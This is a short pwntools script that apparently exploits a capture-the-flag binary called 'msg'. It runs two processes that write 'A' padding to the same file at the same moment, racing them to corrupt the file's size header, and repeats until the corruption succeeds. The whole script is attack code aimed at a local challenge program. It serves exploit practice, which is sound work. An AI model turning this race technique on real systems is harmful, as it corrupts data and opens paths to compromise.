from pwn import *
import os

context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

DEBUG = True

os.chdir("./files")

def r(p, msg):
  response = p.recvuntil(msg)
  if DEBUG:
    log.info(response)
  return response

def s(p, msg, enter = True):
  msg = msg + "\n" if enter else msg
  p.send(msg)
  if DEBUG:
    log.info("Sent: " + msg)

def addfile(p):
  r(p, "Exit")
  s(p, "1")

  r(p, "ID : ")
  filename = r(p, "\n")[:-1]

  r(p, "msg:\n")

  return filename

def changefile(p, filename):
  r(p, "Exit")
  s(p, "2")

  r(p, "ID : ")
  s(p, filename)

  r(p, "msg:\n")

while True:
  p1 = process("../msg")
  p2 = process("../msg")

  payload = "A" * 0xf0

  filename = addfile(p1)
  changefile(p2, filename)

  s(p1, payload)
  s(p2, payload)

#p.interactive()
  p1.close()
  p2.close()

  f = open(filename)
  size = f.read()[:4]
  f.close()

  if u32(size) != 0xf0:
    break

  os.system('rm %s' % filename)
